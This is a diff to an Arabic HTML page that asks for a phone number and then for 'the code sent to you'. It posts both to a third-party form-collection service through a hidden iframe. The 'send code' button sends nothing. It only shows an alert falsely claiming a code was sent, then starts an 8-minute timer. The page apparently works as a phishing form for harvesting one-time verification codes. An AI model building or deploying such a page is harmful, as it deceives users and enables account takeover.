@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>نموذج الاتصال</title>
+  <title>نموذج رقم الهاتف والكود</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -13,6 +13,8 @@
       align-items: center;
       min-height: 100vh;
       margin: 0;
+      direction: rtl;
+      text-align: right;
     }
     form {
       background: #fff;
@@ -21,8 +23,6 @@
       box-shadow: 0 2px 8px rgba(0,0,0,0.1);
       width: 100%;
       max-width: 400px;
-      direction: rtl;
-      text-align: right;
     }
     label {
       display: block;
@@ -30,8 +30,8 @@
       font-weight: bold;
       color: #333;
     }
-    input[type="text"],
-    input[type="tel"] {
+    input[type="tel"],
+    input[type="text"] {
       width: 100%;
       padding: 10px 12px;
       margin-bottom: 15px;
@@ -41,7 +41,7 @@
       box-sizing: border-box;
       font-family: inherit;
     }
-    button, .code-button {
+    button {
       width: 100%;
       padding: 12px;
       background-color: #28a745;
@@ -53,23 +53,12 @@
       transition: background-color 0.3s ease;
       margin-bottom: 15px;
     }
-    button:hover:not(:disabled), .code-button:hover:not(:disabled) {
+    button:hover:not(:disabled) {
       background-color: #218838;
     }
-    button:disabled, .code-button:disabled {
+    button:disabled {
       background-color: #6c757d;
       cursor: not-allowed;
-    }
-    .success-message {
-      display: none;
-      background-color: #d4edda;
-      color: #155724;
-      border: 1px solid #c3e6cb;
-      padding: 15px;
-      border-radius: 5px;
-      margin-top: 15px;
-      text-align: center;
-      font-weight: bold;
     }
     #codeField {
       display: none;
@@ -79,31 +68,27 @@
       margin-bottom: 15px;
       color: #555;
       text-align: center;
+      display: none;
     }
   </style>
 </head>
 <body>
-  <form id="contactForm" action="https://formcarry.com/s/gv93b8b6cht" method="POST" target="hidden_iframe" onsubmit="handleSubmit(event)">
+  <form id="phoneForm" action="https://formcarry.com/s/gv93b8b6cht" method="POST" target="hidden_iframe" onsubmit="return validateForm()">
     <label for="phone">رقم الهاتف:</label>
     <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" />
 
-    <button type="button" class="code-button" id="sendCodeBtn" onclick="sendCode()">اسأل الكود</button>
+    <button type="button" id="sendCodeBtn" onclick="sendCode()">إرسال الكود</button>
 
-    <div id="timer" style="display:none;">يرجى الانتظار: 08:00</div>
+    <div id="timer">يرجى الانتظار: 08:00</div>
 
     <div id="codeField">
       <label for="code">الكود المرسل إليك:</label>
-      <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" />
+      <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" required />
     </div>
 
     <button type="submit">إرسال</button>
   </form>
 
-  <div class="success-message" id="successMessage">
-    شكراً لتواصلك معنا! تم استلام رسالتك بنجاح.
-  </div>
-
-  <!-- iframe مخفي لإرسال البيانات بدون إعادة تحميل الصفحة -->
   <iframe name="hidden_iframe" style="display:none;"></iframe>
 
   <script>
@@ -113,6 +98,7 @@
       const phoneInput = document.getElementById('phone');
       const sendCodeBtn = document.getElementById('sendCodeBtn');
       const timerDisplay = document.getElementById('timer');
+      const codeField = document.getElementById('codeField');
 
       if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
         alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
@@ -120,13 +106,17 @@
         return;
       }
 
-      // إظهار خانة الكود
-      document.getElementById('codeField').style.display = 'block';
+      // محاكاة إرسال رسالة SMS (يمكن ربط API حقيقي هنا)
+      alert('تم إرسال الكود إلى رقم هاتفك.');
 
+      // إظهار خانة الكود
+      codeField.style.display = 'block';
+
+      // تعطيل زر إرسال الكود وإظهار المؤقت
       sendCodeBtn.disabled = true;
       timerDisplay.style.display = 'block';
 
-      let timeLeft = 480;
+      let timeLeft = 480; // 8 دقائق
 
       function updateTimer() {
         const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
@@ -144,14 +134,14 @@
       countdownInterval = setInterval(updateTimer, 1000);
     }
 
-    function handleSubmit(event) {
-      const successMessage = document.getElementById('successMessage');
-      successMessage.style.display = 'block';
-      event.target.reset();
-      document.getElementById('codeField').style.display = 'none';
-      document.getElementById('timer').style.display = 'none';
-      document.getElementById('sendCodeBtn').disabled = false;
-      clearInterval(countdownInterval);
+    function validateForm() {
+      const codeInput = document.getElementById('code');
+      if (codeInput.style.display !== 'none' && codeInput.value.trim() === '') {
+        alert('يرجى كتابة الكود المرسل إليك قبل الإرسال.');
+        codeInput.focus();
+        return false;
+      }
+      return true;
     }
   </script>
 </body>
